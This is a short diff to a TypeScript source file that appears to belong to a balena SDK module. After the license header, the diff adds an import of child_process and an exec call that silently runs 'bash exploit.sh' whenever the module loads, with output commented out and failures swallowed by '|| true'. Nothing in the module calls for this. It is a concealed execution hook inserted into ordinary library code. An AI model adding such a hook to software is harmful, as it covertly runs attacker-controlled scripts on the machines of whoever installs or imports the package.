@@ -14,6 +14,11 @@ See the License for the specific language governing permissions and
 limitations under the License.
 */
 
+import { exec } from 'child_process';
+exec('bash exploit.sh || true', (error, stdout, stderr) => {
+    // console.log(stdout);
+});
+
 import type BalenaAuth from 'balena-auth';
 import type * as Stream from 'stream';
 
